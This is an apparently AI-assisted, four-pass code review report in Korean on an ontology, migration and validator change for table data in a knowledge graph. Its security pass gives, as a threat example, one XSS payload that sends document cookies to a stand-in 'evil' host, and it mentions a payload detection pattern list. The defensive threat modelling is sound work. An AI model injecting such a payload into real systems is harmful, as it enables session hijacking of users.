# Session 050 — Phase 1 Foundation 4-Pass 독립 에이전트 통합 리뷰

**일시**: 2026-05-07 11:37 KST
**대상 변경**: ADR-032 Phase 1 Foundation (ontology v1.4.0 + 마이그레이션 0021 + KnowledgeContract.tables[] + Cat 9 verifier)
**리뷰 방식**: 독립 서브에이전트 4개 병렬 호출 (단일 메시지) — 자가 리뷰 0건
**리뷰 트리거**: auto-review-protocol §"트리거 조건" L2+ 의무 (ontology + DB schema + 코드 변경)

## 변경 파일 (Session 050)

1. `packages/parser/src/ontology-registry.json` — v1.3.0 → **v1.4.0** (4 신규 node_types + 4 edge_types + 4 ID 패턴 + 4 node_types_meta)
2. `packages/parser/src/schema-validator.ts` — `KnowledgeContractTableHeader/Cell/Table` 인터페이스 추가 + `tables?: KnowledgeContractTable[]` optional
3. `packages/parser/src/__tests__/schema-validator.test.ts` — enum sync (7→11 / 13→17) + 4 신규 ID 양성 테스트 (Pass 1 MAJOR-B 흡수)
4. `migrations/0021_table_as_micro_kg.sql` — **신규** (4 테이블 + 10 인덱스 + CHECK + GLOB ID guard)
5. `scripts/verify-engine-contracts.ts` — Cat 9 (`buildTableKgCategory`) + migration required 18→20 + parser required 155→157
6. `docs/adr/ADR-032-table-as-micro-kg.md` — Status: Proposed → **Accepted** + D-TABLE-1~6 영속
7. `docs/quality/master-test-checklist.md` — D1 마이그레이션 카운트 18→20 (Pass 4 MAJOR-F 흡수)
8. `docs/plans/table-processing-architecture-v1.md` — §4.3 cells shape 갱신 (Pass 4 MAJOR-E 흡수) + §4.1 stale paragraph 갱신 (Pass 4 MN-1 흡수)

## 통합 결과

| Pass                 | 에이전트                       | ✅ PASS | 🔴 CRIT | 🟠 MAJOR | 🟡 MINOR |
| -------------------- | ------------------------------ | ------: | ------: | -------: | -------: |
| Pass 1 (Surgeon)     | general-purpose (코드 정합성)  |       6 |       0 |        2 |        2 |
| Pass 2 (Architect)   | general-purpose (cross-module) |       5 |       0 |        2 |        2 |
| Pass 3 (Advocate)    | general-purpose (UX + 보안)    |       6 |       0 |        1 |        3 |
| Pass 4 (Contract)    | general-purpose (기획 대조)    |      12 |       0 |        2 |        2 |
| **통합 (중복 제거)** | —                              |  **29** |   **0** |    **6** |    **6** |

**판정**: **CRITICAL 0건 → "완료" 선언 가능** (auto-review-protocol §"완료 선언 기준").
MAJOR 6건 분류: 즉시 수정 3건 (본 세션 흡수) / Phase 2 진입 전 carry-over 3건.

## 🟠 MAJOR (중복 제거 6건)

### ✅ 즉시 수정 (Session 050 흡수 완료)

#### MAJOR-B (Pass 1) — `inferNodeTypeFromId` 4 신규 패턴 양성 테스트 부재

- **원인**: schema-validator.test.ts:208-215 양성 테스트가 7 기존 ID만 covers. TBL/TROW/TCOL/TCELL ID 회귀 시 silent.
- **수정**: schema-validator.test.ts에 it 블록 2개 추가 (`infers correct types for v1.4.0 Table-as-Micro-KG IDs` + `does not collide TCOL- with TC-`). parser 카운트 155 → 157 / verify required 동일 갱신.

#### MAJOR-E (Pass 4) — plan §4.3 cells shape ↔ 구현 분기 (Silent Pivot 의심)

- **원인**: plan §4.3 line 187 명세 `cells: { row_index, col_index, value, type, formula_ref? }[]` (인덱스 기반) ↔ 구현 `KnowledgeContractTableCell` (`row_id/col_id/value_text/value_type/formula_id/merged_with_id` ID 기반). D1 FK 정규화 진화는 합리적이나 plan 미갱신 = drift.
- **수정**: plan §4.3을 Session 050 영속 형태로 갱신 + `★ Session 050 갱신 (Pass 4 MAJOR-E 흡수)` 명시. Silent Pivot 차단 정합.

#### MAJOR-F (Pass 4) — `master-test-checklist.md §6.2` 마이그레이션 카운트 미갱신

- **원인**: verify-engine-contracts.ts MAJOR-A1 게이트 ("두 파일 동시 갱신 의무") 위반 — verify 18→20 / master-test 18 잔존 = 문서 정합성 silent drift.
- **수정**: master-test-checklist.md:193 `**18** | **18**` → `**20** | **20**`.

### ⏳ Phase 2 진입 전 의무 (handoff-057 carry-over)

#### MAJOR-A (Pass 1 + Pass 3 중복) — `validateKnowledgeContract.tables[]` 검증 로직 부재

- **원인**: schema-validator.ts:140 `tables?: KnowledgeContractTable[]` optional 추가됐으나 `validateKnowledgeContract` 본문에 `contract.tables` 순회 / ID 패턴 검증 / FK dangling 체크 0건. DB CHECK가 유일 방어선 → 위반 시점 = D1 INSERT 실패 시.
- **이월 사유**: Phase 1 = optional schema 영속 단계. Phase 2 BATCH 재추출 시 `tables[]` 채워지므로 그 시점 의무. handoff-057 §"Phase 2 진입 전 의무" 명시.

#### MAJOR-C (Pass 2) — Drizzle 정의 누락 (`apps/api/src/db/schema.ts`)

- **원인**: 4 신규 테이블의 Drizzle ORM 정의 부재. raw SQL만 가능 → admin-web/api type-safe 경로 부재.
- **이월 사유**: Phase 2 admin-web G5.5 검수 UI 진입 시점 의무. drizzle-kit push 사고 위험은 schema.ts:8-15 헤더 가드로 차단.

#### MAJOR-D (Pass 2) — Hard Rule 28 UPDATE 차단 미적용 (`table_structures.updated_at` trigger 부재)

- **원인**: `prevent_*_update` trigger가 knowledge_nodes/formulas/constants에만. 표는 `human_reviewed_at` 갱신 의도로 UPDATE 허용 가정. INSERT+SUPERSEDES 일관성 측면 ADR-032에 미명시.
- **이월 사유**: Phase 2 진입 전 ADR-032 §"Temporal 정합" 명시 + 0022 마이그레이션으로 `prevent_table_structures_update` trigger 또는 명시적 UPDATE 허용 영속.

## 🟡 MINOR (중복 제거 6건, Phase 2 초기 carry-over)

| ID   | Pass   | 내용                                                 | 권고                                                |
| ---- | ------ | ---------------------------------------------------- | --------------------------------------------------- |
| m1-1 | Pass 1 | `loadOntologyRegistry` catch swallow (디버깅 어려움) | console.error 추가                                  |
| m1-2 | Pass 1 | `formula_id` supersedes 검증 부재                    | Phase 2 BATCH 재추출 검증 게이트                    |
| m2-1 | Pass 2 | ARCHITECTURE.md/ONTOLOGY.md 4 신규 노드 미반영       | Phase 1 마무리 task                                 |
| m2-2 | Pass 2 | 4 edge_type truth_weight 정렬 미정의                 | ADR-032 Phase 2 §RAG 명시                           |
| m3-1 | Pass 3 | a11y enum 누락 (rowspan/colspan ARIA)                | Phase 3 React 렌더 시점                             |
| m3-2 | Pass 3 | `value_text` 길이 무제한                             | `CHECK (length(value_text) <= 4096)` 권장 (Phase 2) |
| m3-3 | Pass 3 | `source` sanitization 미규정                         | admin-web G5.5 React text 의무 ADR 명시             |
| MN-1 | Pass 4 | plan §4.1 line 95 stale `^CELL-` paragraph           | ✅ Session 050 갱신 흡수                            |
| MN-2 | Pass 4 | tables[] optional vs Phase 2 의무                    | MAJOR-A와 동일 영역, carry-over                     |

## 핵심 반론 (각 Pass Devil's Advocate)

- **Pass 1**: BATCH-1 재추출 진입 후 LLM이 `pattern_type='A_simple'`인데 `cells[].formula_id`를 채워 보내면 schema-validator는 통과 → DB CHECK 통과 → 의미 깨진 데이터 적재. → MAJOR-A `tables[]` 검증 로직 + pattern_type ↔ value_type cross-validation 게이트 의무.
- **Pass 2**: Phase 2 Drizzle 추가 시점에 신규 개발자가 `drizzle-kit push` 실수 → 4 테이블 drop+recreate → 적재된 표 데이터 소실. 추가로 `INTEGER strftime` (0021) ↔ `text default sql\`(unixepoch())\`` (schema.ts) 타입 mismatch silent corruption. → MAJOR-C Drizzle 정의 + 타입 일관성 게이트.
- **Pass 3**: 공격자가 `value_text`에 `<img src=x onerror=fetch('//evil/'+document.cookie)>` 주입. raw 응답 단계 `XSS_PAYLOAD_PATTERNS` 차단 OK이나 우회 경로(직접 JSON 객체 전달) 사용 시 `validateKnowledgeContract.tables` 미검증 → admin-web G5.5 sanitize 누락 시 검수자 세션 탈취. → MAJOR-A + m3-3 동시 흡수 의무.
- **Pass 4**: 미래 maintainer가 plan §4.3 line 187 `cells: { row_index, col_index, ... }`를 정답으로 읽고 batch-processor 시스템 프롬프트에 `row_index 정수로 출력하라` 작성 → LLM이 인덱스 출력 → schema-validator 무검증 통과 → D1 `table_cells.row_id` NOT NULL FK 위반. → MAJOR-E plan 갱신 + MAJOR-A 의무.

## 검증 (post-fix)

- parser test: 155 → **157** PASS (4 신규 ID 양성 테스트 흡수)
- verify run1+run2 = **PASS 6/0/1** 일치 (Cat 9 신규 + Cat 1+2+3 + Cat 6 마이그레이션 카운트 모두 통과)
- TD-VRF-001 미발현 (post-v1.4.0 4회 + post-MAJOR-fix 2회 = 6회 연속 PASS 일치)

## 영속 의무 (다음 세션 carry-over)

handoff-session-057.md §"Phase 2 진입 전 의무"에 다음 명시:

- MAJOR-A: `validateKnowledgeContract.tables[]` 검증 로직 (Phase 2 BATCH 재추출 직전)
- MAJOR-C: Drizzle 정의 4 테이블 (admin-web G5.5 진입 시)
- MAJOR-D: `prevent_table_structures_update` trigger 또는 ADR-032 §Temporal 명시 (0022 마이그레이션)
- Minor 7건: Phase 2 초기 task batch

## 결론

**판정: 완료 가능 (CRITICAL 0건)**. 진산 결정 D-TABLE-1~6 권장 채택 정합 영속 + 마이그레이션 0021 staging+production 적재 + Cat 9 검증 PASS. plan↔구현 정합 회복 (MAJOR-E/F 즉시 흡수). MAJOR-A/C/D는 Phase 2 진입 차단 게이트로 handoff-057에 명시 이월.
